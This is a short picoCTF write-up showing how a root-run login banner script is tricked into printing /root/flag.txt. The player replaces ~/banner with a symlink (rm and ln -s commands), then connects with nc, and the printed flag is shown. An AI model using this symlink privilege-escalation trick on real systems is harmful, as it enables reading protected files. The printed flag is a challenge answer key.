First step is to get the password from the unsecure port.  Then use that to login and answer the questions you can find via Google.

On the server you are logged in as `player` and you need to get the flag file at `/root/flag.txt`.  The Python script in `/root` is what runs when you login.

The first thing the banner script does is read the banner file.  The way I "hacked" the script was to delete `~/banner` and replace it with a symlink to the flag:

```
player@challenge:~$ rm banner
rm banner
player@challenge:~$ ln -s /root/flag.txt ./banner
ln -s /root/flag.txt ./banner
```

Then open up a new terminal and login:

```
└─$ nc tethys.picoctf.net 51737
picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_a0e119d4}

what is the password? 
```

Works because the Python script is being run as `root` so it will read the flag file that is owned by `root`.